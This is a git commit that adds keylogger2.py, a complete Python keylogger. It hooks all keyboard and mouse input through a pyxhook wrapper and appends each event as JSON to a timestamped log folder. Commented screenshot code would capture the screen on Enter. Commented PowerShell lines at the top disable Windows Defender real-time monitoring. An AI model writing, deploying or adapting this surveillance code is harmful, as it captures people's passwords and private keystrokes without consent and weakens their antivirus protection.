7333e6c4a9100af7fd5e05fe7fbef8d5bd7f1038
Oleg Skuibida <59469383+OlegSkuibida@users.noreply.github.com>
2026-01-19 15:53:20 +0300

    ley2

---
+++ keylogger2.py
@@ -0,0 +1,46 @@
+# import needed modules
+#Set-MpPreference -DisableRealtimeMonitoring $true
+#Set-MpPreference -DisableRealtimeMonitoring $false
+
+import os
+#import pyautogui
+from datetime import datetime
+import pyxhookJson as pyxhook
+import json
+
+def main():
+    log_path = f'{os.getcwd()}/{datetime.now().strftime("%Y-%m-%d_%H-%M")}/'
+    os.mkdir(log_path, 0o777)
+    # Specify the name of the file (can be changed)
+    # The logging function with {event parm}
+    log_file = log_path+'keylog.log'
+    print("Logging to file:", log_file)
+    def OnEvent(event):        
+        data = event.get()
+        print("eventdata:",json.dumps(data))
+        with open(log_path+'activity.log', "a") as f:
+            f.write('\n'+json.dumps(data))  # Write to the file
+        if(data[1]==1 or data[4]=='Return'):
+            #im = pyautogui.screenshot()        
+            #im.save(log_path+str(data[0])+'.jpg')        
+            print(str(data[0]))
+
+    # Create a hook manager object
+    hm = pyxhook.HookManager()
+    hm.HookKeyboard()  # set the hook
+    hm.HookMouse()
+    hm.KeyDown = OnEvent
+    hm.MouseAllButtonsDown = OnEvent
+    try: 
+        hm.start()  # start the hook    
+        print("Keylogger started...")
+    except Exception as ex:
+        if(hm): hm.cancel()
+        # Write exceptions to the log file, for analysis later.
+        msg = f"Error while catching events:\n  {ex}"
+        pyxhook.print_err(msg)
+        with open(log_file, "a") as f: f.write(f"\n{msg}")
+
+
+if __name__ == "__main__":
+    main()
